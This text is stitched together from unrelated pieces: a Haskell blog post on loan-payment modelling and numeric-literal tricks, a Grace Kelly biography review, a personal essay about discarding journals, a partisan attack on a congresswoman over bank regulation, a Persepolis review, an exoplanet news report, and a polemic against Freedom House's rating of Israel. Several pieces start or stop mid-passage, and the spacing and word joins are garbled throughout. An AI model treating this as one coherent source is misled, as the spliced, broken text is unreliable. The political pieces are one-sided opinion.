This is fine for finding the payment for a particular month , but I would also like to derive a textual description of the payment plan – which is n’t possible with functions .
From stuff I ’ve read previously , I think my two options are :
Lisp - like : Represent the payment schedule as data ( ie. like an AST ) and provide an eval function .
This allows introspection into structure of the payment schedule .
Code is data , data is code .
Arrow - like :
The payment strategy could be a tuple of the function and a textual description .
When strategies are combined , the combinator would merge the textual descriptions as well as producing new combined functions .
I ’m not totally convinced that the english language is ‘ compositional ’ in this way though – it might end up with really clumsy phrasing .
Crazy Lennart - inspired postfix operators
Initially , the only way I had to create a ‘ Currency ’ value was via the ‘ pounds ’ function .
In haskell , the function precedes the argument , hence it looks like “ pounds 20 ” .
The source code would read nicer if I could write this as “ 20 pounds ” like we do in english .
I did n’t think this was possible in Haskell .
Then I remembered seeing Lennart Augustsson ’s crazy embedding of BASIC into Haskell .
In particular , he had code which looked like this :
runBasic $ do 10 PRINT " HELLO " 20 END
How the heck does that parse ?
It ’s using ‘ do ’ notation , so “ 20 END ” must have a type in the Monad class .
But , as I understood things , “ x y ” means “ apply the ( function ) value x to value y ” .
And “ 20 ” does n’t look much like a function to me .
Digging into the source , I found this :
-- 10 END instance Num ( END -> Expr a ) where from Integer i c = ...
Hmm , interesting .
This is saying that ( some ) function type can be treated as if it is “ number like ” and provides a mechanism for converting integer literals in source code to that type .
I had n’t fully appreciated this , but the Haskell Report says that numeric literals are n’t quite as literal as I expected – the literal integer value gets passed through ‘ fromInteger ’ and can therefore be made into any Numeric type .
So this code really says “ Hey ghc , if you come across a “ 42 ” in the source code , you can turn that into a function if you need to ” .
In the BASIC example , the next thing on line 20 is “ END ” , a constructor for the type also called END .
So , ghc will be looking to turn “ 42 ” into something that can be used as a function taking an argument of type END , and so it ’ll call this instance of fromInteger .
Hurrah , I can use the same ‘ trick ’ to make my currencies look nicer :
data MONEY = Pounds | Pence instance Num ( MONEY -> Currency ) where fromInteger i Pounds = C ( i * 100 ) fromInteger i Pence = C i
Now I can say “ 42 Pounds ” or “ 23 Pence ” .
The “ 42 ” will become a function with type MONEY -> Currency .
The “ MONEY ” type is really just a tag – used to choose the parse but that ’s it .
The Pounds / Pence tags force the appropriate overloading of fromInteger to be chosen , and this will construct a Currency value ( represented as number of pence , and using a simple wrapper constructor called C ) .
Is this better , or just “ clever ” ?
I ’m not sure yet .
It ’s certainly easier to read .
But I feel I ’ve taken a step away from “ pure haskell ” into a slightly weird world .
Still , if I were writing in lisp , I would n’t think twice about doing this kind of thing .
The actual app
Shocker , I ’ve produced an app which is actually useful to me in “ teh real world ” .
I have a big TODO list of stuff which will fit nicely into the app – time - varying interest rates , inflation predictions and NPV calculations .
None of which , of course , I will ever actually get around to adding .
But it ’s still useful in its present state , so a win !
Here ’s what the “ summary ” view says – it omits the montly breakdown and instead reports the overall savings possible via the different payment strategies :
We are looking at loan of £ 1000.00 at 5.0 % over 10y , which has required monthly payment of £ 10.58 Baseline : Total interest : £ 272.97 Total payments : £ 1272.97 Duration=10y 1 m Overpayment scenario " 2 pm , 200 initial " : Total interest : £ 132.09 Total payments : £ 1132.09 Duration=6y 3 m Compared to baseline : interest=£ - 140.88 , payments =£-140.88 , duration = - 3y 10 m
Overpayment scenario " 2 pm only " : Total interest : £ 216.50 Total payments : £ 1216.50 Duration=8y 1 m Compared to baseline : interest=£ - 56.47 , payments =£ -56.47 , duration= - 2y Overpayment scenario " 200 initial " : Total interest : £ 163.52 Total payments : £ 1163.52 Duration=7y 8 m Compared to baseline : interest=£ - 109.45 , payments =£-109.45 , duration= - 2y 5 m Overpayment scenario " 400 initial " : Total interest : £ 87.73 Total payments : £ 1087.73 Duration=5y 6 m Compared to baseline : interest=£ - 185.24 , payments =£-185.24 , duration= - 4y 7 m Overpayment scenario " 200 after 2y " : Total interest : £ 191.42 Total payments : £ 1191.42 Duration=7y 10 m Compared to baseline : interest=£ - 81.55 , payments =£ -81.55 , duration= - 2y 3 m Overpayment scenario " 400 after 2y " : Total interest : £ 137.90 Total payments : £ 1137.90 Duration=5y 10 m Compared to baseline : interest=£ - 135.07 , payments =£-135.07 , duration= - 4y 3 m
Eep , it ’s 01:30 .. how did that happen ?

One spring day in 1952 , Miss Grace Kelly , of Philadelphia , now resident in New York , went across to “ a barn - like studio on the far West Side of Manhattan . ”
That is how she later described it , as if recalling a foreign trip .
In the barn , she did a screen test , for a movie called “ Taxi , ” opposite Robert Alda : the fair young maid and the darker , troubled fellow , each pleading with the other .
Kelly wears a soft sweater and , beneath it , a white blouse , whose demure collar is just discernible .
We can also make out a mild Irish accent — not much of a stretch , for one of the Kelly clan .
“ It ai n’t that I ’m not fond of you , ” she says , in words that have weighed like lead , throughout history , on the hearts of disappointed guys .
Her eyes keep moving across the man , as if he were a passage of verse .
There is both hesitancy and force in this woman ; you can picture her , faced with a decision , flitting back and forth , and yet , once decided , becoming quite fiery and sure .
It was a combination that appealed to the director of “ Taxi , ” Gregory Ratoff .
He liked the look of Kelly , all the more so because , in his view , the look was that of a plain Jane .
According to Kelly , “ I was in the ‘ too ’ category for a very long time .
I was too tall , too leggy , too chinny .
I remember that Mr. Ratoff kept yelling , ‘ She ’s perfect !
What I love about this girl is that she ’s not pretty ! ’ ”

Few movie directors have been certifiably blind , and on the strength of this oversight Ratoff tops the list with ease , but , to his credit — and to Kelly ’s relief — he was ready to rave about this creature for reasons other than her looks .
Ratoff ’s bosses at Twentieth Century Fox did n’t share his eagerness , and she failed to get the part , but his fellow - directors knew better .
Donald Spoto , the author of a new biography , “ High Society : The Life of Grace Kelly ” ( Harmony ; $ 25.99 ) , seems to place her screen test in 1950 , but I watched it recently , and there , in the corner of the frame , is the date “ May 26 1952 . ”
In short , it was only a matter of months before Kelly came to the attention of John Ford , at M - G - M. ( Spoto ’s remark on such practice — “ it was common for studios to exchange screen tests made by actors they subsequently rejected ” — has the right ring of pitiless mercantile behavior .
You take my leavings , I ’ll have yours . )
Ford warmed to what he saw —
“ This dame has breeding , quality , class , ” he said , adding , “ I ’ll bet she ’ll knock us on our ass ! ” — and , come November , the dame was in Africa , shooting “ Mogambo ” and knocking Clark Gable on his ass .
That may have rattled a bit , because he had false teeth .
And still “ Taxi ” sped on .
In the summer of 1953 , Kelly was summoned to the presence of Alfred Hitchcock , who wanted to inspect her for a leading role in “ Dial M for Murder . ”
He had not yet seen “ Mogambo ” ; he was not even certain , he once told Spoto , that he had seen “ High Noon , ” which had been released a year before , and in which Kelly played Gary Cooper ’s Quaker wife .
But he had seen her in the “ Taxi ” test , and that was sufficient ; to those fleeting minutes , therefore , we owe not only “ Dial M for Murder ” but “ Rear Window , ” one of the monuments of the medium , and “ To Catch a Thief , ” one of its blithest feats of seduction .
Mathematically , Kelly presents an unusual case .
She made only eleven feature films , in a career that lasted just five years , from 1951 to 1956 .
Of those eleven , six are treasured — five and a half , maybe , depending on how you feel about “ Mogambo , ” with its amusing study of the way baby elephants behave in proximity to mud .
Of the remaining movies , “ Green Fire ” is a certified stinker , while “ The Country Girl ” — for which Kelly won an Oscar — is drab and overwrought .
Kelly appears in “ The Bridges at Toko - Ri , ” despite her lofty billing , for about fifteen minutes , and in “ Fourteen Hours ” for a fraction of that .
As for “ The Swan , ” her penultimate film , it was a smash in its day but has faded into a delicate curiosity , like a watercolor on a sunny wall .
Yet the patina of Kelly herself — the gloss of her name and fame , the freshness and directness of her look — has , if anything , acquired a richer lustre .
Accounts of her modus vivendi never cease to accrue , yet the more we know the less we seem to grasp .
Starlight can be quantified — 1954 was “ this year of Grace , ” according to Life — but its effect on maddened mortals below is all but impossible to gauge .
The Kelly effect is not unlike the James Dean effect ( three great films , three bit parts ) , whereby a few brief hours of screen time continue unquenchably to burn .
Grace was the third child of John B. Kelly , and far from his favorite .
He was a strapping , outdoors figure , who grew rich in the construction business , and won three Olympic gold medals for rowing ; Franklin D. Roosevelt made him National Physical Fitness Director .
He pushed his only son , John , Jr. , in similar directions .
Grace was soft and sickly as a child , “ always sniffling , ” she recalled , and her father preferred her elder sister , Margaret ( known as Peggy ) , for whom he predicted great things .
“ I thought it would be Peggy whose name would be up in lights one day .
Anything that Grace could do , Peggy could do better , ” he told McCall ’s in January , 1955 , shortly before the disappointing daughter got her Academy Award .
Peggy and John , Jr. , for their part , grew up to lead problematic lives , dampened by drink .
A home movie exists of the children at play , on a beach — perhaps at the family vacation home in Ocean City , New Jersey .
The children , in bathing costumes , are still small , and each is summoned forth to face the camera and salute , as if being a Kelly were a form of active service .
When in Rome , you can see the movie for yourself ; just wander down the Via del Corso and duck into the Fondazione Memmo , where an exhibition entitled “ Gli Anni di Grace Kelly , Principessa di Monaco ” is showing till the end of February .
There is much to dote upon , beginning with a birth certificate , dated November 12 , 1929 .
There are film clips , posters , magazine covers , dresses , jewels , a giant Hermès Kelly handbag , and a room devoted to the day , in 1956 , when Kelly married Prince Rainier and became Princess Grace .
There are letters from a range of acquaintances , including George Balanchine , Jacqueline Onassis , and Greta Garbo , who admits to being “ upside - downy ” and confides , as one deity to another , that “ I have not been around much with human beings lately . ”
No , indeed .
The deal that Kelly struck with herself is , in some ways , even stranger than Garbo ’s withdrawal from the world .
The younger woman ’s kernel of privacy was no less keenly guarded , yet she chose to live and marry in the public glare , as if daring herself to bury any frailties beneath the sheen of self - possession .
Even when wretched , she would be right - side - uppy .
The most touching object in the show is the scrapbook compiled by the teen - age Grace .
A paper napkin , a Christmas - tree decoration , a Schaefer beer mat , a bookmark with lines from Emily Dickinson , a red matchbook , a ticket for a charity golf match , and the wrapper from a pack of Wrigley ’s Doublemint , its cheerful greenness still bright .
Joseph Cornell would have taken one look and wept .
There are notes , inscribed in ink by the owner : “ This is where Harper got me the silver compact he gave me for Valentine ’s , ” “ Daddy bought this for me at the Penn Cornell game , ” and , beside a torn blue ticket stub for the Locust Street Theatre , in Philadelphia , the words “ Dec. 9th ’ 43 .
Our class went in to see ‘ Kiss + Tell . ’ ”
The stage bug , unencouraged by her parents , was starting to bite , and , with barely a jump , Kelly went from collecting playbills to appearing on them .
In 1947 , before enrolling at the American Academy of Dramatic Arts , which charged a cool five hundred dollars a year , she moved to New York , where she resided , as nice young ladies did , at the Barbizon Hotel for Women , at Lexington and Sixty - third Street , and had an affair with an actor and director eleven years her senior , as nice young ladies did n’t .
What is more , he was married , though separated , and Jewish ; “ The fact that I could fall in love with a Jew was beyond them , ” Kelly said of her parents , in a letter to a friend .
For the next two years , she alternated between theatrical training and professional modelling , including spots on TV commercials .
The first of these , for insecticide , required the future Princess to run about , “ smiling like an idiot and spraying like a demon , ” as she put it , but , sadly , no whiff of it lingers .
Shortly after graduation , in 1949 , she won roles at the Bucks County Playhouse , in New Hope , Pennsylvania , and Donald Spoto , helpfully , reprints a program note .
It is a masterpiece of belittlement :
She is the daughter of John B. Kelly , of Philadelphia .
Her brother recently figured in the news by winning the Diamond Sculls at the Henley Regatta in England .
Her father was a champion oarsman and is well known as the former chairman of the Democratic Party in Philadelphia .
Reading this , you ca n’t help marking out the time line of Kelly ’s liberation .
What she did was escape from one starchy , disapproving , tradition - tight environment , become her own woman for eight or nine years , and then dive head first into another , as if her conscience had caught up with her .
If , for the term of her fame , she was able to enslave the attention of all who knew her , as well as the millions who did n’t , it may be because she was forced — or forced herself — to pack a lifetime of freedom into the briefest span .
She sometimes comes across as the last of the Jamesians , slipping the bonds of the New World , “ affronting her destiny , ” as James says of Isabel Archer , yet winding up before long in a parody of the Old — in a miniature state , antiquated and fussy , where she could live in limitless style but never at ease .
( It is reported that , as a gesture of good will on the occasion of her marriage , Monaco ’s only prisoner was released . )
Every woman who came to visit her , Princess Grace learned , was obliged to wear a hat .

According to Spoto ’s calculations , Kelly , having been noticed by scouts , performed in no fewer than thirty - five live television dramas between 1950 and 1954 .
( Who would n’t wish to have seen her as Dulcinea to Boris Karloff ’s Don Quixote ? )
Amid these , she did indeed play a character from Henry James , a nineteenth - century enchantress from his late , time - travelling novel “ The Sense of the Past . ”
Onstage , two years before , she had played Marian Almond in an adaptation of “ Washington Square . ”
Marian is described by James as “ a pretty little person of seventeen , with a very small figure and a very big sash , to the elegance of whose manners matrimony had nothing to add , ” and what is extraordinary , in retrospect , is the number of Kelly projects that arrowed in on marriage — on the loom and the lure of it , on the sacrifices that might be incurred , on the dreams of flight that it could not help but promote .
Her first appearance on the big screen , in “ Fourteen Hours , ” already fits the bill ; in fur coat , veil , and pearls , she is helped through a gridlock of cars , in a hurry to get to the lawyers ’ office , where her divorce will be finalized .
In the end , she decides to halt the proceedings and give love another go .
Next came “ High Noon , ” which begins with Kelly as a newlywed , worried — and no wonder , when you see the varmints whom her husband must confront — that she is set to become an instant widow .
Then we get “ Mogambo , ” in which Kelly must tamp down her attraction to a hunter and safari guide ( Clark Gable ) in favor of a stolid husband ; “ The Country Girl , ” in which her marriage is imperilled by drink ; “ The Bridges at Toko - Ri , ” in which she sees her husband off to war and death ; “ Rear Window , ” where her dearest wish is to win Jimmy Stewart ; and “ To Catch a Thief , ” in which she is pretty much pimped by her own mama .
And so to “ The Swan , ” where we find Kelly ’s Princess Alexandra , a noblewoman in a sunlit European land , in the lull before the First World War , torn between a royal tutor ( Louis Jourdan ) , glossy and flame - hearted , and the dry , balding prince ( Alec Guinness ) for whom she is intended .
“ Your whole life , your whole upbringing , has been devoted to just one thing : to make you fit to be a queen , ” Alexandra ’s mother tells her .
Temptations are resisted ; duty calls , and the happy couple — or , at least , the correct couple — get hitched .
“ The Swan ” wrapped in December , 1955 .
On December 28th , Prince Rainier proposed to Kelly , and what one longs to know is :
Had she planned what kind of groom she would snare in the end , and , perhaps unconsciously , angled her choice of movies in that direction , or did the matchmaking simply prove — to a world thirsty for illusion , only a decade after the Second World War — that movies could still come true ?
To that last question , “ High Society , ” which was filmed during Kelly ’s engagement , is a tarter response than its reputation might suggest , with Kelly , playing the ex-wife of Bing Crosby , veering back toward him on the eve of her second marriage .
( And enjoying a bracing dip with Frank Sinatra along the way . )
It is customary to denigrate “ High Society ” by comparing it with its parent , “ The Philadelphia Story , ” but I knew the child first , when I was a child , too , and nothing can undo the movies that we are led to in our youth , or the skein of impressions that they leave .
I remember my mother explaining to me , drawing on who knows what store of apocrypha , that Prince Rainier had watched the scene of his wife - to - be , droopy with drink , being lugged through the moonlight in Sinatra ’s arms , both of them in towelling robes , and that His Serene Highness had bridled at the outrage and declared that her works be outlawed , henceforth and on pain of death , within the bounds of his kingdom .
This struck me as precisely how a jealous monarch should behave , and the twin sense of Kelly as both sovereign and subversive was planted in my brain .
I was told how remarkable it was that Kelly had deigned to sing , and therefore how natural it was that her yacht - borne duet with Crosby , “ True Love , ” should have sold a million copies on record .
She fondles the end of his squeezebox as they harmonize , but that , I suspect , went over my head , as did their bizarre exchange beside the swimming pool :

I can't really remember how old I was .
I may have been in my late thirties , maybe I was in my early forties .
And I can't remember what time of year it was .
But I can remember the dark of the night .
I must have been alone that evening , strange enough , with a wife and children always close by .
I can see myself , I seem like myself but also like a man I do not know , I can see myself in the attic , piling a few boxes full of loose papers and notebooks .
Separating notebooks from one box and moving them to another , not poring through them yet pausing to make a few now inexplicable exclusions .
Pulling a few things out and setting them safely aside .
I can see myself carrying those boxes down the stairs and out of the house to the sidewalk .
I know I 'd chosen to take these things out at night , late at night .
They would only sit on the sidewalk for a few hours , there would likely be no passerby , no one to wonder at the contents of the boxes .
I knew of course that the trash men came very early to my house .
That by the time I was awake , these boxes full of loose papers and selected notebooks would be gone .
When I was a boy , I liked to draw .
I drew pictures of houses and I invented towns and countries for the houses to be in .
Sometimes I made maps of these places and sometimes I gave them names and histories .
And , when I was a little older , a young man , I liked to write stories .
Stories , and sometimes plays , even film scripts .
I collected these drawings and these stories and I kept them in boxes .
I never showed them to anyone , I just kept them in boxes , and in fact I was a little bit careful to make sure that no one saw them , they were mine and I just kept them in boxes .
By the time I was in high school , I was writing journals .
I wrote those journals in the spiral bound notebooks I used in class .
I remember those journals quite well .
There was nothing so incriminating in them , but there was much youthful angst and passion .
The world was a dramatic place to me then .
Everything seemed terribly important .
My friends knew me as a writer , I was sure to write something someday .
And then it ended .
Quite suddenly , I now see .
It ended at a certain period at college , a period in which I was apparently making a few life decisions .
Though I know I did n't see it for that at the time .
Decisions about which parts of my personality were to stay and which were to go .
I must have been a determined young man , because the parts I meant to go , went .
Romantic notions of life as a writer .
Resistance to the bourgeois life .
Taking life very seriously .
Self examination .
And writing itself .
And attraction to men ....
I did n't write another personal word for the next twenty years .
No stories .
No poems .
No screenplays , for heaven 's sake .
No letters that could not be read by an acquaintance .
And no journals .
That night , that dark night when I might have been thirty seven or I might have been forty two , that long night when I was for reasons now lost left alone in the house , that night when I crept out to the sidewalk carrying those boxes , in the dark so no one would see me , no one could see what I was doing , no one could rescue these things I was abandoning .
The drawings .
The stories .
And the journals .
I threw away all the journals .
Years of journals .
In an attempt , I only now recognize , an attempt to kill them .
To kill parts of myself .
All those journals , those simple spiral bound notebooks , the overwrought teenage prose , the insecure young man , the questions , the doubts , the steps across boundaries , out with the trash .
Then they were gone .
And I forgot that night .
I forgot the impetus , I forgot the feeling of relief at having them gone , I forgot the need to examine , to express , to expand .
Until I could n't forget any longer .
Truth is , it ’s very painful for me to see myself carrying those boxes out to the street .
I can't remember what I was thinking or why I was doing what I was doing , but I can remember the thickness of the night air .
I can feel the weight of the boxes as I carried them down the walk .
I can see the notebooks , sitting amongst the week 's trash .
I had killed something .
Something alive , heart beating .
In layman 's terms , Bean 's amendment guts the current regulatory framework in which states play the role of the local cops on the beat .
It 's like moving all of the country 's fire departments to Washington .
We need regulators out on the front line who can respond quickly to problems before someone 's house is burned down by a liar 's loan or an entire economy is burned by risky investments ...
We need states to be cops on the beat watching the banks .
So why in the world is Bean trying to disarm the police so necessary for protecting Main Street from Wall Street ?
It 's because the three - term Illinois congresswoman and leader in the New Democrat Coalition has pocketed almost $ 2.2 million since she 's been in Congress from the banking and financial services interests she oversees as a member of the House Financial Services Committee , according to the Center for Responsive Politics , including $ 338,125 so far this year .
Wall Street Democrats like Bean are currently flooding the House floor with amendments favorable to Wall Street to the House financial reform bill .
Lawmakers , responding to popular anger against banks and bailouts , voted repeatedly during hours of committee debate in recent months to add amendments that police large financial companies in ways not envisioned by a White House proposal in June ...
The shift could have major implications for larger financial companies , particularly if the public mood crystallizes around the notion that too big to fail means too big at all .
New fees devised by the House for large financial companies could top $ 150 billion , industry experts said ...
The populist bent could alienate moderate lawmakers and make it harder for legislation to pass .
But it could also mean more dramatic changes for banks if the package eventually becomes law .
... The House of Representatives could vote as soon as Friday on a plan to overhaul financial - sector regulation .
The legislation has several measures aimed at policing big banks :
1 ) Regulators would be able to block a healthy bank from certain business practices or mergers , even order it to shrink , if its size , interconnectedness or other variables were deemed to pose a risk to the U.S. economy .
2 ) Financial companies with more than $ 50 billion of assets would have to pay into a $ 150 billion fund to deal with future collapses of large financial companies .
3 ) The government would be able to order certain large banks to split off their commercial bank from their investment bank if regulators identify specific concerns .
4 ) Large banks would have to submit to consumer compliance exams from a new federal agency , while many small banks would be exempt .
“ The message was [ House Financial Services Chairman Barney ]
Frank and the Democratic majority are ruining America , ruining capitalism , and stand up for yourselves , ” said a lobbyist who attended the meeting .
“ They said , ‘ Look , you all oppose this bill , but only a few of you have come out publicly . ’ ”
In addition to asking trade associations to get their members in Congressional districts to write letters opposing the legislation , Republicans asked for companies and trade associations to use their Democratic consultants to gather intelligence on where members of the Congressional Black Caucus and the Blue Dog Coalition are in supporting the legislation .
That tweet above from this morning refers to a post by Mike Elk regarding , Melissa Bean 's mania to weaken any and all legislation that allows states to regulate banksters , her patrons and the financiers of her disgraceful political career .
Unfortunately she has a seat on the House Financial Services Committee , where she is constantly working with Republican obstructionists to undermine progressive reformers .
Also important to read today is a piece by Damian Paletta at the Financial Bill Hits Big Banks Hardest , which goes a long way towards clarifying an important aspect of the current financial legislation being discussed in the Financial Services Committee .
Smaller institutions are supporting the bill , like the members of the Independent Community Bankers of America and the Council of Institutional Investors ( a non-profit which represents pension funds for unions , public employees and companies . )
As Barney Frank , Chairman of the Financial Services Committee , said the other day , " Sometimes you are best defined by your opponents -- and this is one of those cases . "
Barney , meet Melissa ; she 's as bad as Spencer Bachus ( R - AL ) , Jeb Hensarling ( R - TX ) , Scott Garrett ( R- NJ ) , Tom Price ( R- GA ) , Patrick McHenry ( R-NC ) , Michele Bachmann ( R - MN ) and the other bankster lackeys on the committee .
In fact , according to , Boehner , Cantor , Kevin McCarthy , Garrett and Hensarling " met with more than a 100 lobbyists at the Capitol Visitors Center on Tuesday afternoon to try to fight back against financial regulatory overhaul legislation . "

While the French may be besotted with them , graphic novels – apart from those by cult practitioners such as Art Spiegelman and Joe Sacco – have never had much credibility on these shores .
Marjane Satrapi ’s two - part memoir changed that .
In simple , bold , black - and - white drawings she tells the story of her childhood as the daughter of two well - meaning Marxists in revolutionary Iran .
Through her six - year - old eyes and later as a student she recounts the experience of both the Islamic Revolution and the war with Iraq and she does so with both seriousness and charm .
Like Khaled Hosseini , Satrapi shows a country by which the West is transfixed from an unusual angle .
It was the combination of this powerful background , the striking graphics and a touching innocence that stopped Persepolis from being mawkish and made it into affecting personalised history .

Fournewfound planets orbiting two nearby stars add weight to the promise ofdetecting habitable worlds within the next few years , researchers said today .
Two of theextrasolar planets are considered super - Earths , more massive than Earth but less massive than Uranus and Neptune .
Spotting trueEarth - sized planetsis challenging with current technology , but the presence of super - Earthssuggests finding a world like ours is just a matter of time , researchers say .
" Thesedetections indicate that low - mass planets are quite common around nearby stars , " said study team member Steven Vogt , a professor of astronomy and astrophysicsat the University of California , Santa Cruz .
" The discovery of potentiallyhabitable nearby worlds may be just a few years away . "
Theastronomers are not sure if the super - Earths are rocky like our own world or ifthey have some other composition .
The teamfound the new planet systems by combining data gathered at the W. M. KeckObservatory in Hawaii and the Anglo - Australian Telescope ( AAT ) in New South Wales , Australia .
They inferred the existence of the planets by noting theworlds ' gravitational effects on the parent star 's orbit .
This method is calledthe radial velocity , or wobble , technique .
The objectshave not been photographed .
Three ofthe exoplanets orbit the star 61 Virginis , which is virtually a twin of the sunand lies 28 light - years away in the constellation of Virgo .
( At this time ofyear , Virgo can be seen rising a few hours before the sun . )
Theresearchers estimated the minimum mass of each planet as : 5.1 Earth masses for 61 Vir b , 18 Earth masses for 61 Vir c , and 23 Earth masses for 61 Vir d , according study team member Chris Tinneyof the University of New South Wales .
" Sothe smallest one is in the super - Earth mass range , and is the first planet likethis to be found around a sun-like star , " Tinney told SPACE.com .
Othersuper - Earths have been found aroundstars that are cooler and redder than the sun , he said .
Tinneyadded , " This is exciting , because it demonstrates the ability of our teamto find planets at these interesting , small masses around solar - mass stars .
Ifwe want to one day find habitable planets that are really like the Earth insystems that are really like ours , then those are the sorts of stars we need tobe able to find low - mass planets around . "
The secondnew system found by the team features a 7.5 - Earth - mass planet orbiting HD 1461 , another near - perfect twin of the sun located 76 light - years away in theconstellation Cetus .
The scientists say at least one and possibly twoadditional planets also orbit the star .
HD 1461 canbe seen with the naked eye in the early evening under good dark - sky conditions .
Theresearchers say they are n't sure whether the planet , now called HD 1461b , is ascaled - up version of Earth , composed largely of rock and iron , or whether , likeUranus and Neptune , it is composed mostly of water .
Epitomizing freedom : an Israeli soldier aims a gas grenade launcher at a Palestinian demonstrator in the occupied West Bank .
( Oren Ziv/ActiveStills )
Established in 1941 , Freedom House markets itself as “ an independent watchdog organization that supports democratic change , monitors the status of freedom around the world , and advocates for democracy and human rights . ”
Its board of directors , chaired by a former US deputy secretary of defense , is a who ’s who of Democratic and Republican former US government officials , prominent neoconservatives and Israel lobby stalwarts such as Tom Dine , former executive director of AIPAC .
In 2007 , more than two - thirds of its $ 16 million budget came directly from the United States government .
Not surprisingly then , Freedom House ’s report reveals more about the groupthink of the US establishment — especially with respect to its continued efforts to dominate the Middle East and ensure Israel ’s supremacy — than it does about the countries surveyed .
Focusing on two categories of “ freedom ” — “ civil liberties ” and “ political rights ” — the report divides the world ’s 194 countries into three groups : “ free ” ( 89 ) , “ partly free ” ( 58 ) , and “ not free ” ( 47 ) .
Interestingly , Freedom House records “ declines in freedom ” in “ countries that had registered positive trends in previous years , including Bahrain , Jordan , Kenya and Kyrgyzstan . ”
Jordan was one of only six countries to move from the “ partly free ” category to “ not free . ”
What does it say about US “ democracy promotion ” that Jordan , Bahrain and Kyrgyzstan — major political and military operating bases for the “ war on terror ” and US - led occupations in Iraq and Afghanistan — have become less free as their dependence on the US has increased ?
Sadly , while the report frets that “ the most powerful authoritarian regimes [ such as Russia and China ] have become more repressive , more influential in the international arena , and more uncompromising , ” it has nothing at all to say about the US role in restricting freedom and spreading mayhem around the world .
Sometimes this is truly absurd as the report points to “ continued terrorist and insurgent violence in Pakistan , Afghanistan , Iraq , Somalia and Yemen , ” but fails to note that two of these countries are under direct US military occupation ( Afghanistan and Iraq ) while the US is intervening militarily in the other three .
( The report presents a mixed picture for the US - occupied countries ; both are “ Not Free ” but Iraq allegedly became more free during 2009 and Afghanistan less free . )
Rather than offer any introspection on the inverse relationship between US efforts at global domination on the one hand , and the spread of freedom on the other , the report ’s overview essay concludes with a call for more vigorous intervention : “ The United States and other democracies should take the initiative to meet the authoritarian challenge … ”
Freedom House ’s approach to Israel provides the starkest example of the abyss into which liberal thinking has fallen on the relationship between colonialism and freedom .
Israel , we are told , “ remains the only country in the [ Middle East ] region to hold a Freedom in the World designation of Free . ”
We are informed euphemistically that “ The beginning of the year [ 2009 ] was marred by fierce fighting between the Israeli military and the Hamas movement in the Gaza Strip . ”
There is no mention of the deliberate targeting by Israel of Gaza ’s civilian infrastructure and the resulting massive destruction , and death and injury to thousands of Palestinian civilians .
Nothing is said of the denial of fundamental political , civil and human rights , or freedom of movement , association and education to four million Palestinians living under Israeli military occupation and siege in the West Bank and Gaza Strip .
There is no mention of the systematic discrimination , and social and political exclusion faced by 1.5 million Palestinian citizens of Israel , nor of the denial of the right of return of millions of Palestinian refugees .
There is an acknowledgment that “ Hundreds of people were arrested during demonstrations against the Gaza conflict , and the parliamentary elections committee passed a measure banning two political parties from national elections , though the ban was quickly overturned by the Supreme Court . ”
Despite this , on the tables accompanying the report , “ Israel ” receives the highest score of “ 1 ” for political rights , and a very respectable “ 2 ” for civil liberties — on a par with Italy and Japan .
The overall impression is of minor glitches that could occur in any exemplary “ Western ” democracy .
Then on a separate table of “ Disputed Territories ” we find “ Israeli - occupied territories ” and “ Palestinian Authority - administered territories ” both listed .
Both are given the designation “ Not Free ” and nearly the lowest scores for political rights and civil liberties .
There is no narrative to explain who is responsible for this dire state of affairs .
This convenient separation allows for all the ugly realities of what “ free ” Israel does in the occupied territories to be pushed out of sight and ignored .
But in what scheme can Israel be awarded freest of the free status when for two - thirds of its existence , since 1967 , it has ruled directly over millions of disenfranchised Palestinians through violence and repression ?
The idea that the political regime in Israel ’s pre-1967 boundaries can be looked at as a “ democracy ” even while the situation in the occupied territories can be criticized as undemocratic is very widespread among Israelis and American liberals .
Former US President Jimmy Carter has been excoriated ( and recently forced to apologize ) by the Israel lobby for calling the situation in the West Bank and Gaza Strip “ apartheid . ”
Yet even he had simultaneously claimed that within its pre-1967 boundaries , “ Israel is a wonderful democracy with equal treatment of all citizens whether Arab or Jew . ”
True , Palestinian citizens of Israel can vote and are accorded civil rights far wider than their Palestinian counterparts in the West Bank and Gaza Strip .
But even Israeli Jews commonly concede that Palestinian citizens suffer systematic and severe disadvantage and total exclusion from key political decisions about the country .
Israeli Jewish leftists ( a rapidly dwindling group ) and Western liberal sympathizers tend to view Israel within its 1967 boundaries as a flawed democracy — perfectible with a reallocation of resources and less discrimination against non-Jews , even as they remain fully invested in maintaining Israel as a “ Jewish state ” with a Jewish demographic majority .
They view the 1967 occupation of the West Bank and Gaza Strip as the original sin that corrupted a purer Zionist vision , and thus remain fixated on the chimera of “ ending the occupation ” through a “ two - state solution . ”
Once this nirvana is reached , so they believe , Israel can resume its destiny as a liberal democratic state among others .
But it is not just the discrimination and limited rights of Palestinian citizens and other non-Jews that undermine the claim that Israel — considered separately from the West Bank and Gaza Strip — is a democracy .
Nor is it even that Israeli settler - citizens in the West Bank have full voting rights for the Israeli parliament while Palestinians in the same territory have none .
It is that “ Israel ” and the “ occupied territories ” are two sides of the same coin .
Israel ’s 1948 and subsequent ethnic cleansing of Palestinians , and ongoing repressive rule in the West Bank and Gaza Strip are not exceptional or temporary conditions .
They are constitutive of the situation that allows Israeli Jews to currently claim they live in a ( flawed ) liberal democracy .
To be clear , the argument is not that conditions in Israel and the occupied territories are indistinguishable ; rather it is that they form a single interdependent system .
Israeli Jews can “ freely ” elect a Jewish government in Israel only because most Palestinians have already been ethnically cleansed .
Thus the maintenance of this “ liberal democratic ” Jewish space depends directly on the permanent denial of fundamental rights to Palestinians .
Palestinian citizens of Israel — who form 20 percent of the population within Israel ’s pre-1967 boundaries — are , as noted , accorded limited liberal rights .
This helps boost Israel ’s external image as a “ wonderful democracy , ” but if the exercise of these rights ever threatens Jewish domination , they are curtailed .
Examples include the constant legal harassment of Palestinian members of the Knesset , and various legislative projects for loyalty oaths or to ban commemoration of the Nakba , the 1948 ethnic cleansing of 750,000 Palestinians .
Overwhelming Israeli Jewish opposition to calls by Palestinians in Israel for the country to be a “ state of all its citizens ” is an indication that Israeli Jews value their own supremacy over democracy .
Israel has sometimes been described as an “ ethnocracy ” — a state where one ethnic group dominates and enjoys a wide range of liberal rights which are denied to others .
But these liberal rights depend directly on the successful repression of the non-privileged ethnic group (s ) .
As rebellions by the disenfranchised require ever greater levels of repression and violence to control , the repression must also be turned inwards .
In recent days , Israel extended for six months a ban on Sheikh Raed Salah , an Israeli citizen , and leader of the Northern Branch of the Islamic Movement in Israel , from traveling to Jerusalem , Israel ’s ostensible capital , where he had been exercising his civil rights to campaign against Israeli efforts to “ Judaize ” the city .
